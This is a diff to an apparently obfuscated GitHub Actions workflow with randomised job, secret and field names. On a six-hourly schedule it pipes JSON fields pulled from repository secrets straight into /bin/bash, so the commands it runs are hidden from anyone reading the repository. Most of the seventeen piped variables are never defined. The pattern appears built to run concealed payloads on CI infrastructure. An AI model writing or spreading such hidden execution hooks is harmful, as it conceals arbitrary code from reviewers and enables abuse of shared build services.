@@ -2,7 +2,7 @@ name: caiwuhui2415
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
+    - cron: '17 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: caiwuhui2415
         env:
-          wempt477: ${{ secrets.wempt477 }}
+          fwsb3: ${{ secrets.fwsb3 }}
         run: |
-          echo $wempt477 | jq -r .cqvho14 | /bin/bash
-          echo $sxb097 | jq -r .u33806 | /bin/bash
-          echo $r7 | jq -r .cbyi9 | /bin/bash
-          echo $zrqda81549 | jq -r .zlrj7744 | /bin/bash
-          echo $sqq38 | jq -r .ad385 | /bin/bash
-          echo $ndrn7 | jq -r .a10 | /bin/bash
-          echo $vyu074 | jq -r .ttzlz3504 | /bin/bash
-          echo $vamk46105 | jq -r .kyzoq89 | /bin/bash
+          echo $fwsb3 | jq -r .envx2336 | /bin/bash
+          echo $h6042 | jq -r .hdf46429 | /bin/bash
+          echo $qhgf82 | jq -r .kex9 | /bin/bash
+          echo $ewsrj84548 | jq -r .pf188 | /bin/bash
+          echo $m52342 | jq -r .rxx30 | /bin/bash
+          echo $rdd3828 | jq -r .gcu87104 | /bin/bash
+          echo $nwzhv790 | jq -r .q110 | /bin/bash
+          echo $nru29 | jq -r .re85983 | /bin/bash
+          echo $ngajx23418 | jq -r .fd6 | /bin/bash
+          echo $eivyx8 | jq -r .f0 | /bin/bash
+          echo $o1409 | jq -r .xq83 | /bin/bash
+          echo $lu7681 | jq -r .ws89608 | /bin/bash
+          echo $p4 | jq -r .fmau02 | /bin/bash
+          echo $qr9287 | jq -r .nq1011 | /bin/bash
+          echo $yzg82 | jq -r .zp90041 | /bin/bash
+          echo $otgr081 | jq -r .gkj73198 | /bin/bash
+          echo $nzfbg4951 | jq -r .rieum57 | /bin/bash
 
